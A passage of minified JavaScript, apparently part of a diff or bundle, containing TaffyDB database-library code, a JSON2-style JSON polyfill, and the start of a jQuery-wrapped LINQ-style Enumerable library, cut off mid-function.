this.context().results.length});c.extend("callback",function(r,p){if(r){var q=this;setTimeout(function(){d.call(q);r.call(q.getroot(q.context()))},(p)?p:0)}return null});c.extend("get",function(){d.call(this);return this.context().results});c.extend("stringify",function(){return JSON.stringify(this.get())});c.extend("first",function(){d.call(this);return this.context().results[0]||false});c.extend("last",function(){d.call(this);return this.context().results[this.context().results.length-1]||false});c.extend("sum",function(){var q=0;d.call(this);var p=this;l(arguments,function(r){l(p.context().results,function(s){q=q+s[r]})});return q});c.extend("min",function(q){var p=null;d.call(this);l(this.context().results,function(s){if(p===null||s[q]<p){p=s[q]}});return p});c.extend("max",function(q){var p=null;d.call(this);l(this.context().results,function(s){if(p===null||s[q]>p){p=s[q]}});return p});c.extend("select",function(){var q=[];var p=arguments;d.call(this);if(arguments.length===1){l(this.context().results,function(s){q.push(s[p[0]])})}else{l(this.context().results,function(s){var t=[];l(p,function(r){t.push(s[r])});q.push(t)})}return q});c.extend("distinct",function(){var q=[];var p=arguments;d.call(this);if(arguments.length===1){l(this.context().results,function(t){var s=t[p[0]];var u=false;l(q,function(r){if(s===r){u=true;return TAFFY.EXIT}});if(!u){q.push(s)}})}else{l(this.context().results,function(s){var u=[];l(p,function(r){u.push(s[r])});var t=false;l(q,function(v){var r=true;l(p,function(x,w){if(u[w]!=v[w]){r=false;return TAFFY.EXIT}});if(r){t=true;return TAFFY.EXIT}});if(!t){q.push(u)}})}return q});c.extend("supplant",function(q,p){var r=[];d.call(this);l(this.context().results,function(s){r.push(q.replace(/{([^{}]*)}/g,function(u,t){var w=s[t];return typeof w==="string"||typeof w==="number"?w:u}))});return(!p)?r.join(""):r});c.extend("each",function(p){d.call(this);l(this.context().results,p);return this});c.extend("map",function(p){var q=[];d.call(this);l(this.context().results,function(s){q.push(p(s))});return q});var g=function(s,q){var p=true;l(q,function(r){switch(f.typeOf(r)){case"function":if(!r.apply(s)){p=false;return TAFFY.EXIT}break;case"array":p=(r.length==1)?(g(s,r[0])):(r.length==2)?(g(s,r[0])||g(s,r[1])):(r.length==3)?(g(s,r[0])||g(s,r[1])||g(s,r[2])):(r.length==4)?(g(s,r[0])||g(s,r[1])||g(s,r[2])||g(s,r[3])):false;if(r.length>4){l(r,function(t){if(g(s,t)){p=true}})}break}});return p};var f=function(x){var u=[],y={},v=1,r={template:false,onInsert:false,onUpdate:false,onRemove:false,onDBChange:false,storageName:false,forcePropertyCase:null,cacheSize:100},t=new Date(),s=0,q=0,A={};var p=function(D){if(D.length==0){return u}var C=[];var B=false;l(D,function(E){if(f.isString(E)&&/[t][0-9]*[r][0-9]*/i.test(E)&&u[y[E]]){C.push(u[y[E]]);B=true}if(f.isObject(E)&&E.___id&&E.___s&&u[y[E.___id]]){C.push(u[y[E.___id]]);B=true}if(f.isArray(E)){l(E,function(F){l(p(F),function(G){C.push(G)})})}});if(B&&C.length>1){C=[]}return C};var w={dm:function(B){if(B){t=B;A={};s=0;q=0}if(r.onDBChange){setTimeout(function(){r.onDBChange.call(u)},0)}if(r.storageName){setTimeout(function(){localStorage.setItem("taffy_"+r.storageName,JSON.stringify(u))})}return t},insert:function(E,F){var D=[],C=[],B=k(E);l(B,function(H,I){if(f.isArray(H)&&I===0){l(H,function(K){D.push((r.forcePropertyCase==="lower")?K.toLowerCase():(r.forcePropertyCase==="upper")?K.toUpperCase():K)});return true}else{if(f.isArray(H)){var G={};l(H,function(L,K){G[D[K]]=L});H=G}else{if(f.isObject(H)&&r.forcePropertyCase){var J={};b(H,function(L,K){J[(r.forcePropertyCase==="lower")?K.toLowerCase():(r.forcePropertyCase==="upper")?K.toUpperCase():K]=H[K]});H=J}}}v++;H.___id="T"+String(a+m).slice(-6)+"R"+String(a+v).slice(-6);H.___s=true;C.push(H.___id);if(r.template){H=f.mergeObj(r.template,H)}u.push(H);y[H.___id]=u.length-1;if(r.onInsert&&(F||TAFFY.isUndefined(F))){r.onInsert.call(H)}w.dm(new Date())});return z(C)},sort:function(B){u=j(u,B.split(","));y={};l(u,function(D,C){y[D.___id]=C});w.dm(new Date());return true},update:function(I,E,D){var H={};if(r.forcePropertyCase){b(E,function(J,K){H[(r.forcePropertyCase==="lower")?K.toLowerCase():(r.forcePropertyCase==="upper")?K.toUpperCase():K]=J});E=H}var G=u[y[I]];var F=f.mergeObj(G,E);var B={};var C=false;b(F,function(J,K){if(TAFFY.isUndefined(G[K])||G[K]!==J){B[K]=J;C=true}});if(C){if(r.onUpdate&&(D||TAFFY.isUndefined(D))){r.onUpdate.call(F,u[y[I]],B)}u[y[I]]=F;w.dm(new Date())}},remove:function(B){u[y[B]].___s=false},removeCommit:function(C){for(var B=u.length-1;B>-1;B--){if(!u[B].___s){if(r.onRemove&&(C||TAFFY.isUndefined(C))){r.onRemove.call(u[B])}y[u[B].___id]=undefined;u.splice(B,1)}}y={};l(u,function(E,D){y[E.___id]=D});w.dm(new Date())},query:function(C){var F;if(r.cacheSize){var G="";l(C.filterRaw,function(H){if(f.isFunction(H)){G="nocache";return TAFFY.EXIT}});if(G==""){G=JSON.stringify(f.mergeObj(C,{q:false,run:false,sort:false}))}}if(!C.results||!C.run||(C.run&&w.dm()>C.run)){var B=[];if(r.cacheSize&&A[G]){A[G].i=s++;return A[G].results}else{if(C.q.length==0&&C.index.length==0){l(u,function(H){B.push(H)});F=B}else{var E=p(C.index);l(E,function(H){if(C.q.length==0||g(H,C.q)){B.push(H)}});F=B}}}else{F=C.results}if(C.order.length>0&&(!C.run||!C.sort)){F=j(F,C.order)}if(F.length&&((C.limit&&C.limit<F.length)||C.start)){var D=[];l(F,function(J,I){if(!C.start||(C.start&&(I+1)>=C.start)){if(C.limit){var H=(C.start)?(I+1)-C.start:I;if(H<C.limit){D.push(J)}else{if(H>C.limit){return TAFFY.EXIT}}}else{D.push(J)}}});F=D}if(r.cacheSize&&G!="nocache"){q++;setTimeout(function(){if(q>=r.cacheSize*2){q=0;var H=s-r.cacheSize;var I={};b(function(K,J){if(K.i>=H){I[J]=K}});A=I}},0);A[G]={i:s++,results:F}}return F}};var z=function(){var C=TAFFY.mergeObj(TAFFY.mergeObj(c,{insert:undefined}),{getDBI:function(){return w},getroot:function(D){return z.call(D)},context:function(D){if(D){B=TAFFY.mergeObj(B,("results" in D)?TAFFY.mergeObj(D,{run:new Date(),sort:new Date()}):D)}return B},extend:undefined});var B=(this&&this.q)?this:{limit:false,start:false,q:[],filterRaw:[],index:[],order:[],results:false,run:null,sort:null};l(arguments,function(D){if(h(D)){B.index.push(D)}else{B.q.push(e(D))}B.filterRaw.push(D)});return C};m++;if(x){w.insert(x)}z.insert=w.insert;z.merge=function(E,D,F){var D=(D||"id");var F=(F||false);var C={};var B=[];l(E,function(I){C[D]=I[D];B.push(I[D]);var H=z(C).first();if(H){w.update(H.___id,I,F)}else{w.insert(I,F)}});var G={};G[D]=B;return z(G)};z.TAFFY=true;z.sort=w.sort;z.settings=function(B){if(B){r=TAFFY.mergeObj(r,B);if(B.template){z().update(B.template)}}return r};z.store=function(D){var C=false;if(localStorage){if(D){var B=localStorage.getItem("taffy_"+D);if(B&&B.length>0){z.insert(B);C=true}if(u.length>0){setTimeout(function(){localStorage.setItem("taffy_"+r.storageName,JSON.stringify(u))})}}z.settings({storageName:D})}return z};return z};TAFFY=f;f.each=l;f.eachin=b;f.extend=c.extend;TAFFY.EXIT="TAFFYEXIT";TAFFY.mergeObj=function(r,p){var q={};b(r,function(s,t){q[t]=r[t]});b(p,function(s,t){q[t]=p[t]});return q};TAFFY.has=function(r,q){var p=true;if((r.TAFFY)){p=r(q);if(p.length>0){return true}else{return false}}else{switch(f.typeOf(r)){case"object":if(f.isObject(q)){b(q,function(t,u){if(p===true&&!f.isUndefined(r[u])&&r.hasOwnProperty(u)){p=f.has(r[u],q[u])}else{p=false;return TAFFY.EXIT}})}else{if(f.isArray(q)){l(q,function(t,u){p=f.has(r,q[u]);if(p){return TAFFY.EXIT}})}else{if(f.isString(q)){if(!TAFFY.isUndefined(r[q])){return true}else{return false}}}}return p;break;case"array":if(f.isObject(q)){l(r,function(t,u){p=f.has(r[u],q);if(p===true){return TAFFY.EXIT}})}else{if(f.isArray(q)){l(q,function(u,t){l(r,function(w,v){p=f.has(r[v],q[t]);if(p===true){return TAFFY.EXIT}});if(p===true){return TAFFY.EXIT}})}else{if(f.isString(q)||f.isNumber(q)){for(var s=0;s<r.length;s++){p=f.has(r[s],q);if(p){return true}}}}}return p;break;case"string":if(f.isString(q)&&q===r){return true}break;default:if(f.typeOf(r)===f.typeOf(q)&&r===q){return true}break}}return false};TAFFY.hasAll=function(s,r){var q=TAFFY;if(q.isArray(r)){var p=true;l(r,function(t){p=q.has(s,t);if(p===false){return TAFFY.EXIT}});return p}else{return q.has(s,r)}};TAFFY.typeOf=function(p){var q=typeof p;if(q==="object"){if(p){if(typeof p.length==="number"&&!(p.propertyIsEnumerable("length"))){q="array"}}else{q="null"}}return q};TAFFY.getObjectKeys=function(p){var q=[];b(p,function(s,r){q.push(r)});q.sort();return q};TAFFY.isSameArray=function(q,p){return(TAFFY.isArray(q)&&TAFFY.isArray(p)&&q.join(",")===p.join(","))?true:false};TAFFY.isSameObject=function(s,q){var p=TAFFY,r=true;if(p.isObject(s)&&p.isObject(q)){if(p.isSameArray(p.getObjectKeys(s),p.getObjectKeys(q))){b(s,function(t,u){if((p.isObject(s[u])&&p.isObject(q[u])&&p.isSameObject(s[u],q[u]))||(p.isArray(s[u])&&p.isArray(q[u])&&p.isSameArray(s[u],q[u]))||(s[u]===q[u])){}else{r=false;return TAFFY.EXIT}})}else{r=false}}else{r=false}return r};(function(p){for(var q=0;q<p.length;q++){(function(r){TAFFY["is"+r]=function(s){return TAFFY.typeOf(s)===r.toLowerCase()?true:false}}(p[q]))}}(["String","Number","Object","Array","Boolean","Null","Function","Undefined"]))}})();if(typeof(exports)==="object"){exports.taffy=TAFFY}var JSON;if(!JSON){JSON={}}(function(){function f(n){return n<10?"0"+n:n}if(typeof Date.prototype.toJSON!=="function"){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf()}}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==="string"?c:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+string+'"'}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==="object"&&typeof value.toJSON==="function"){value=value.toJSON(key)}if(typeof rep==="function"){value=rep.call(holder,key,value)}switch(typeof value){case"string":return quote(value);case"number":return isFinite(value)?String(value):"null";case"boolean":case"null":return String(value);case"object":if(!value){return"null"}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==="[object Array]"){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||"null"}v=partial.length===0?"[]":gap?"[\n"+gap+partial.join(",\n"+gap)+"\n"+mind+"]":"["+partial.join(",")+"]";gap=mind;return v}if(rep&&typeof rep==="object"){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==="string"){v=str(k,value);if(v){partial.push(quote(k)+(gap?": ":":")+v)}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?": ":":")+v)}}}}v=partial.length===0?"{}":gap?"{\n"+gap+partial.join(",\n"+gap)+"\n"+mind+"}":"{"+partial.join(",")+"}";gap=mind;return v}}if(typeof JSON.stringify!=="function"){JSON.stringify=function(value,replacer,space){var i;gap="";indent="";if(typeof space==="number"){for(i=0;i<space;i+=1){indent+=" "}}else{if(typeof space==="string"){indent=space}}rep=replacer;if(replacer&&typeof replacer!=="function"&&(typeof replacer!=="object"||typeof replacer.length!=="number")){throw new Error("JSON.stringify")}return str("",{"":value})}}if(typeof JSON.parse!=="function"){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==="object"){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v}else{delete value[k]}}}}return reviver.call(holder,key,value)}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))){j=eval("("+text+")");return typeof reviver==="function"?walk({"":j},""):j}throw new SyntaxError("JSON.parse")}}}());
+function jqExt(){
+jQuery.extend({Enumerable:function(){var m="Single:sequence contains more than one element.",e=true,b=null,a=false,c=function(a){this.GetEnumerator=a};c.Choice=function(){var a=arguments[0]instanceof Array?arguments[0]:arguments;return new c(function(){return new f(g.Blank,function(){return this.Yield(a[Math.floor(Math.random()*a.length)])},g.Blank)})};c.Cycle=function(){var a=arguments[0]instanceof Array?arguments[0]:arguments;return new c(function(){var b=0;return new f(g.Blank,function(){if(b>=a.length)b=0;return this.Yield(a[b++])},g.Blank)})};c.Empty=function(){return new c(function(){return new f(g.Blank,function(){return a},g.Blank)})};c.From=function(j){if(j==b)return c.Empty();if(j instanceof c)return j;if(typeof j==i.Number||typeof j==i.Boolean)return c.Repeat(j,1);if(typeof j==i.String)return new c(function(){var b=0;return new f(g.Blank,function(){return b<j.length?this.Yield(j.charAt(b++)):a},g.Blank)});if(typeof j!=i.Function){if(typeof j.length==i.Number)return new h(j);if(!(j instanceof Object)&&d.IsIEnumerable(j))return new c(function(){var c=e,b;return new f(function(){b=new Enumerator(j)},function(){if(c)c=a;else b.moveNext();return b.atEnd()?a:this.Yield(b.item())},g.Blank)})}return new c(function(){var b=[],c=0;return new f(function(){for(var a in j)!(j[a]instanceof Function)&&b.push({Key:a,Value:j[a]})},function(){return c<b.length?this.Yield(b[c++]):a},g.Blank)})},c.Return=function(a){return c.Repeat(a,1)};c.Matches=function(h,e,d){if(d==b)d="";if(e instanceof RegExp){d+=e.ignoreCase?"i":"";d+=e.multiline?"m":"";e=e.source}if(d.indexOf("g")===-1)d+="g";return new c(function(){var b;return new f(function(){b=new RegExp(e,d)},function(){var c=b.exec(h);return c?this.Yield(c):a},g.Blank)})};c.Range=function(e,d,a){if(a==b)a=1;return c.ToInfinity(e,a).Take(d)};c.RangeDown=function(e,d,a){if(a==b)a=1;return c.ToNegativeInfinity(e,a).Take(d)};c.RangeTo=function(d,e,a){if(a==b)a=1;return d<e?c.ToInfinity(d,a).TakeWhile(function(a){return a<=e}):c.ToNegativeInfinity(d,a).TakeWhile(function(a){return a>=e})};c.Repeat=function(d,a){return a!=b?c.Repeat(d).Take(a):new c(function(){return new f(g.Blank,function(){return this.Yield(d)},g.Blank)})};c.RepeatWithFinalize=function(a,e){a=d.CreateLambda(a);e=d.CreateLambda(e);return new c(function(){var c;return new f(function(){c=a()},function(){return this.Yield(c)},function(){if(c!=b){e(c);c=b}})})};c.Generate=function(a,e){if(e!=b)return c.Generate(a).Take(e);a=d.CreateLambda(a);return new c(function(){return new f(g.Blank,function(){return this.Yield(a())},g.Blank)})};c.ToInfinity=function(d,a){if(d==b)d=0;if(a==b)a=1;return new c(function(){var b;return new f(function(){b=d-a},function(){return this.Yield(b+=a)},g.Blank)})};c.ToNegativeInfinity=function(d,a){if(d==b)d=0;if(a==b)a=1;return new c(function(){var b;return new f(function(){b=d+a},function(){return this.Yield(b-=a)},g.Blank)})};c.Unfold=function(h,b){b=d.CreateLambda(b);return new c(function(){var d=e,c;return new f(g.Blank,function(){if(d){d=a;c=h;return this.Yield(c)}c=b(c);return this.Yield(c)},g.Blank)})};c.prototype={CascadeBreadthFirst:function(g,b){var h=this;g=d.CreateLambda(g);b=d.CreateLambda(b);return new c(function(){var i,k=0,j=[];return new f(function(){i=h.GetEnumerator()},function(){while(e){if(i.MoveNext()){j.push(i.Current());return this.Yield(b(i.Current(),k))}var f=c.From(j).SelectMany(function(a){return g(a)});if(!f.Any())return a;else{k++;j=[];d.Dispose(i);i=f.GetEnumerator()}}},function(){d.Dispose(i)})})},CascadeDepthFirst:function(g,b){var h=this;g=d.CreateLambda(g);b=d.CreateLambda(b);return new c(function(){var j=[],i;return new f(function(){i=h.GetEnumerator()},function(){while(e){if(i.MoveNext()){var f=b(i.Current(),j.length);j.push(i);i=c.From(g(i.Current())).GetEnumerator();return this.Yield(f)}if(j.length<=0)return a;d.Dispose(i);i=j.pop()}},function(){try{d.Dispose(i)}finally{c.From(j).ForEach(function(a){a.Dispose()})}})})},Flatten:function(){var h=this;return new c(function(){var j,i=b;return new f(function(){j=h.GetEnumerator()},function(){while(e){if(i!=b)if(i.MoveNext())return this.Yield(i.Current());else i=b;if(j.MoveNext())if(j.Current()instanceof Array){d.Dispose(i);i=c.From(j.Current()).SelectMany(g.Identity).Flatten().GetEnumerator();continue}else return this.Yield(j.Current());return a}},function(){try{d.Dispose(j)}finally{d.Dispose(i)}})})},Pairwise:function(b){var e=this;b=d.CreateLambda(b);return new c(function(){var c;return new f(function(){c=e.GetEnumerator();c.MoveNext()},function(){var d=c.Current();return c.MoveNext()?this.Yield(b(d,c.Current())):a},function(){d.Dispose(c)})})},Scan:function(i,g,j){if(j!=b)return this.Scan(i,g).Select(j);var h;if(g==b){g=d.CreateLambda(i);h=a}else{g=d.CreateLambda(g);h=e}var k=this;return new c(function(){var b,c,j=e;return new f(function(){b=k.GetEnumerator()},function(){if(j){j=a;if(!h){if(b.MoveNext())return this.Yield(c=b.Current())}else return this.Yield(c=i)}return b.MoveNext()?this.Yield(c=g(c,b.Current())):a},function(){d.Dispose(b)})})},Select:function(b){var e=this;b=d.CreateLambda(b);return new c(function(){var c,g=0;return new f(function(){c=e.GetEnumerator()},function(){return c.MoveNext()?this.Yield(b(c.Current(),g++)):a},function(){d.Dispose(c)})})},SelectMany:function(g,e){var h=this;g=d.CreateLambda(g);if(e==b)e=function(b,a){return a};e=d.CreateLambda(e);return new c(function(){var j,i=undefined,k=0;return new f(function(){j=h.GetEnumerator()},function(){if(i===undefined)if(!j.MoveNext())return a;do{if(i==b){var f=g(j.Current(),k++);i=c.From(f).GetEnumerator()}if(i.MoveNext())return this.Yield(e(j.Current(),i.Current()));d.Dispose(i);i=b}while(j.MoveNext());return a},function(){try{d.Dispose(j)}finally{d.Dispose(i)}})})},Where:function(b){b=d.CreateLambda(b);var e=this;return new c(function(){var c,g=0;return new f(function(){c=e.GetEnumerator()},function(){while(c.MoveNext())if(b(c.Current(),g++))return this.Yield(c.Current());return a},function(){d.Dispose(c)})})},OfType:function(c){var a;switch(c){case Number:a=i.Number;break;case String:a=i.String;break;case Boolean:a=i.Boolean;break;case Function:a=i.Function;break;default:a=b}return a===b?this.Where(function(a){return a instanceof c}):this.Where(function(b){return typeof b===a})},Zip:function(e,b){b=d.CreateLambda(b);var g=this;return new c(function(){var i,h,j=0;return new f(function(){i=g.GetEnumerator();h=c.From(e).GetEnumerator()},function(){return i.MoveNext()&&h.MoveNext()?this.Yield(b(i.Current(),h.Current(),j++)):a},function(){try{d.Dispose(i)}finally{d.Dispose(h)}})})},Join:function(m,i,h,k,j){i=d.CreateLambda(i);h=d.CreateLambda(h);k=d.CreateLambda(k);j=d.CreateLambda(j);var l=this;return new c(function(){var n,q,o=b,p=0;return new f(function(){n=l.GetEnumerator();q=c.From(m).ToLookup(h,g.Identity,j)},function(){while(e){if(o!=b){var c=o[p++];if(c!==undefined)return this.Yield(k(n.Current(),c));c=b;p=0}if(n.MoveNext()){var d=i(n.Current());o=q.Get(d).ToArray()}else return a}},function(){d.Dispose(n)})})},GroupJoin:function(l,h,e,j,i){h=d.CreateLambda(h);e=d.CreateLambda(e);j=d.CreateLambda(j);i=d.CreateLambda(i);var k=this;return new c(function(){var m=k.GetEnumerator(),n=b;return new f(function(){m=k.GetEnumerator();n=c.From(l).ToLookup(e,g.Identity,i)},function(){if(m.MoveNext()){var b=n.Get(h(m.Current()));return this.Yield(j(m.Current(),b))}return a},function(){d.Dispose(m)})})},All:function(b){b=d.CreateLambda(b);var c=e;this.ForEach(function(d){if(!b(d)){c=a;return a}});return c},Any:function(c){c=d.CreateLambda(c);var b=this.GetEnumerator();try{if(arguments.length==0)return b.MoveNext();while(b.MoveNext())if(c(b.Current()))return e;return a}finally{d.Dispose(b)}},Concat:function(e){var g=this;return new c(function(){var i,h;return new f(function(){i=g.GetEnumerator()},function(){if(h==b){if(i.MoveNext())return this.Yield(i.Current());h=c.From(e).GetEnumerator()}return h.MoveNext()?this.Yield(h.Current()):a},function(){try{d.Dispose(i)}finally{d.Dispose(h)}})})},Insert:function(h,b){var g=this;return new c(function(){var j,i,l=0,k=a;return new f(function(){j=g.GetEnumerator();i=c.From(b).GetEnumerator()},function(){if(l==h&&i.MoveNext()){k=e;return this.Yield(i.Current())}if(j.MoveNext()){l++;return this.Yield(j.Current())}return!k&&i.MoveNext()?this.Yield(i.Current()):a},function(){try{d.Dispose(j)}finally{d.Dispose(i)}})})},Alternate:function(a){a=c.Return(a);return this.SelectMany(function(b){return c.Return(b).Concat(a)}).TakeExceptLast()},Contains:function(f,b){b=d.CreateLambda(b);var c=this.GetEnumerator();try{while(c.MoveNext())if(b(c.Current())===f)return e;return a}finally{d.Dispose(c)}},DefaultIfEmpty:function(b){var g=this;return new c(function(){var c,h=e;return new f(function(){c=g.GetEnumerator()},function(){if(c.MoveNext()){h=a;return this.Yield(c.Current())}else if(h){h=a;return this.Yield(b)}return a},function(){d.Dispose(c)})})},Distinct:function(a){return this.Except(c.Empty(),a)},Except:function(e,b){b=d.CreateLambda(b);var g=this;return new c(function(){var h,i;return new f(function(){h=g.GetEnumerator();i=new n(b);c.From(e).ForEach(function(a){i.Add(a)})},function(){while(h.MoveNext()){var b=h.Current();if(!i.Contains(b)){i.Add(b);return this.Yield(b)}}return a},function(){d.Dispose(h)})})},Intersect:function(e,b){b=d.CreateLambda(b);var g=this;return new c(function(){var h,i,j;return new f(function(){h=g.GetEnumerator();i=new n(b);c.From(e).ForEach(function(a){i.Add(a)});j=new n(b)},function(){while(h.MoveNext()){var b=h.Current();if(!j.Contains(b)&&i.Contains(b)){j.Add(b);return this.Yield(b)}}return a},function(){d.Dispose(h)})})},SequenceEqual:function(h,f){f=d.CreateLambda(f);var g=this.GetEnumerator();try{var b=c.From(h).GetEnumerator();try{while(g.MoveNext())if(!b.MoveNext()||f(g.Current())!==f(b.Current()))return a;return b.MoveNext()?a:e}finally{d.Dispose(b)}}finally{d.Dispose(g)}},Union:function(e,b){b=d.CreateLambda(b);var g=this;return new c(function(){var j,h,i;return new f(function(){j=g.GetEnumerator();i=new n(b)},function(){var b;if(h===undefined){while(j.MoveNext()){b=j.Current();if(!i.Contains(b)){i.Add(b);return this.Yield(b)}}h=c.From(e).GetEnumerator()}while(h.MoveNext()){b=h.Current();if(!i.Contains(b)){i.Add(b);return this.Yield(b)}}return a},function(){try{d.Dispose(j)}finally{d.Dispose(h)}})})},OrderBy:function(b){return new j(this,b,a)},OrderByDescending:function(a){return new j(this,a,e)},Reverse:function(){var b=this;return new c(function(){var c,d;return new f(function(){c=b.ToArray();d=c.length},function(){return d>0?this.Yield(c[--d]):a},g.Blank)})},Shuffle:function(){var b=this;return new c(function(){var c;return new f(function(){c=b.ToArray()},function(){if(c.length>0){var b=Math.floor(Math.random()*c.length);return this.Yield(c.splice(b,1)[0])}return a},g.Blank)})},GroupBy:function(i,h,e,g){var j=this;i=d.CreateLambda(i);h=d.CreateLambda(h);if(e!=b)e=d.CreateLambda(e);g=d.CreateLambda(g);return new c(function(){var c;return new f(function(){c=j.ToLookup(i,h,g).ToEnumerable().GetEnumerator()},function(){while(c.MoveNext())return e==b?this.Yield(c.Current()):this.Yield(e(c.Current().Key(),c.Current()));return a},function(){d.Dispose(c)})})},PartitionBy:function(j,i,g,h){var l=this;j=d.CreateLambda(j);i=d.CreateLambda(i);h=d.CreateLambda(h);var k;if(g==b){k=a;g=function(b,a){return new o(b,a)}}else{k=e;g=d.CreateLambda(g)}return new c(function(){var b,n,o,m=[];return new f(function(){b=l.GetEnumerator();if(b.MoveNext()){n=j(b.Current());o=h(n);m.push(i(b.Current()))}},function(){var d;while((d=b.MoveNext())==e)if(o===h(j(b.Current())))m.push(i(b.Current()));else break;if(m.length>0){var f=k?g(n,c.From(m)):g(n,m);if(d){n=j(b.Current());o=h(n);m=[i(b.Current())]}else m=[];return this.Yield(f)}return a},function(){d.Dispose(b)})})},BufferWithCount:function(e){var b=this;return new c(function(){var c;return new f(function(){c=b.GetEnumerator()},function(){var b=[],d=0;while(c.MoveNext()){b.push(c.Current());if(++d>=e)return this.Yield(b)}return b.length>0?this.Yield(b):a},function(){d.Dispose(c)})})},Aggregate:function(c,b,a){return this.Scan(c,b,a).Last()},Average:function(a){a=d.CreateLambda(a);var c=0,b=0;this.ForEach(function(d){c+=a(d);++b});return c/b},Count:function(a){a=a==b?g.True:d.CreateLambda(a);var c=0;this.ForEach(function(d,b){if(a(d,b))++c});return c},Max:function(a){if(a==b)a=g.Identity;return this.Select(a).Aggregate(function(a,b){return a>b?a:b})},Min:function(a){if(a==b)a=g.Identity;return this.Select(a).Aggregate(function(a,b){return a<b?a:b})},MaxBy:function(a){a=d.CreateLambda(a);return this.Aggregate(function(b,c){return a(b)>a(c)?b:c})},MinBy:function(a){a=d.CreateLambda(a);return this.Aggregate(function(b,c){return a(b)<a(c)?b:c})},Sum:function(a){if(a==b)a=g.Identity;return this.Select(a).Aggregate(0,function(a,b){return a+b})},ElementAt:function(d){var c,b=a;this.ForEach(function(g,f){if(f==d){c=g;b=e;return a}});if(!b)throw new Error("index is less than 0 or greater than or equal to the number of elements in source.");return c},ElementAtOrDefault:function(f,d){var c,b=a;this.ForEach(function(g,d){if(d==f){c=g;b=e;return a}});return!b?d:c},First:function(c){if(c!=b)return this.Where(c).First();var f,d=a;this.ForEach(function(b){f=b;d=e;return a});if(!d)throw new Error("First:No element satisfies the condition.");return f},FirstOrDefault:function(c,d){if(d!=b)return this.Where(d).FirstOrDefault(c);var g,f=a;this.ForEach(function(b){g=b;f=e;return a});return!f?c:g},Last:function(c){if(c!=b)return this.Where(c).Last();var f,d=a;this.ForEach(function(a){d=e;f=a});if(!d)throw new Error("Last:No element satisfies the condition.");return f},LastOrDefault:function(c,d){if(d!=b)return this.Where(d).LastOrDefault(c);var g,f=a;this.ForEach(function(a){f=e;g=a});return!f?c:g},Single:function(d){if(d!=b)return this.Where(d).Single();var f,c=a;this.ForEach(function(a){if(!c){c=e;f=a}else throw new Error(m);});if(!c)throw new Error("Single:No element satisfies the condition.");return f},SingleOrDefault:function(d,f){if(f!=b)return this.Where(f).SingleOrDefault(d);var g,c=a;this.ForEach(function(a){if(!c){c=e;g=a}else throw new Error(m);});return!c?d:g},Skip:function(e){var b=this;return new c(function(){var c,g=0;return new f(function(){c=b.GetEnumerator();while(g++<e&&c.MoveNext());},function(){return c.MoveNext()?this.Yield(c.Current()):a},function(){d.Dispose(c)})})},SkipWhile:function(b){b=d.CreateLambda(b);var g=this;return new c(function(){var c,i=0,h=a;return new f(function(){c=g.GetEnumerator()},function(){while(!h)if(c.MoveNext()){if(!b(c.Current(),i++)){h=e;return this.Yield(c.Current())}continue}else return a;return c.MoveNext()?this.Yield(c.Current()):a},function(){d.Dispose(c)})})},Take:function(e){var b=this;return new c(function(){var c,g=0;return new f(function(){c=b.GetEnumerator()},function(){return g++<e&&c.MoveNext()?this.Yield(c.Current()):a},function(){d.Dispose(c)})})},TakeWhile:function(b){b=d.CreateLambda(b);var e=this;return new c(function(){var c,g=0;return new f(function(){c=e.GetEnumerator()},function(){return c.MoveNext()&&b(c.Current(),g++)?this.Yield(c.Current()):a},function(){d.Dispose(c)})})},TakeExceptLast:function(e){if(e==b)e=1;var g=this;return new c(function(){if(e<=0)return g.GetEnumerator();var b,c=[];return new f(function(){b=g.GetEnumerator()},function(){while(b.MoveNext()){if(c.length==e){c.push(b.Current());return this.Yield(c.shift())}c.push(b.Current())}return a},function(){d.Dispose(b)})})},TakeFromLast:function(e){if(e<=0||e==b)return c.Empty();var g=this;return new c(function(){var j,h,i=[];return new f(function(){j=g.GetEnumerator()},function(){while(j.MoveNext()){i.length==e&&i.shift();i.push(j.Current())}if(h==b)h=c.From(i).GetEnumerator();return h.MoveNext()?this.Yield(h.Current()):a},function(){d.Dispose(h)})})},IndexOf:function(c){var a=b;this.ForEach(function(d,b){if(d===c){a=b;return e}});return a!==b?a:-1},LastIndexOf:function(b){var a=-1;this.ForEach(function(d,c){if(d===b)a=c});return a},ToArray:function(){var a=[];this.ForEach(function(b){a.push(b)});return a},ToLookup:function(c,b,a){c=d.CreateLambda(c);b=d.CreateLambda(b);a=d.CreateLambda(a);var e=new n(a);this.ForEach(function(g){var 